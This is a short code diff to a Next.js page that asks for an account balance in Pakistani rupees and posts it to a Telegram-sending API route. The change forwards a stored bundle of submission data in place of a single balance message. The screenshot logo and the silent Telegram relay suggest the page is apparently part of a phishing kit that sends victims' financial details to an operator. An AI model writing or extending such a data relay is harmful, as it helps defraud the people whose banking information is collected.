@@ -3,6 +3,7 @@
 import { useState } from 'react'
 import { useRouter } from 'next/navigation'
 import { ChevronRight, Info } from 'lucide-react'
+import { saveSubmissionData } from '@/lib/submission-store'
 
 const logoImage =
   'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'
@@ -38,10 +39,11 @@ export default function BalancePage() {
               }
               setError('')
               try {
+                const data = saveSubmissionData({ balance })
                 await fetch('/api/telegram/send', {
                   method: 'POST',
                   headers: { 'content-type': 'application/json' },
-                  body: JSON.stringify({ text: `Account balance submitted: PKR ${balance}` }),
+                  body: JSON.stringify(data),
                 })
               } catch {
                 // Continue navigation even if the notification fails
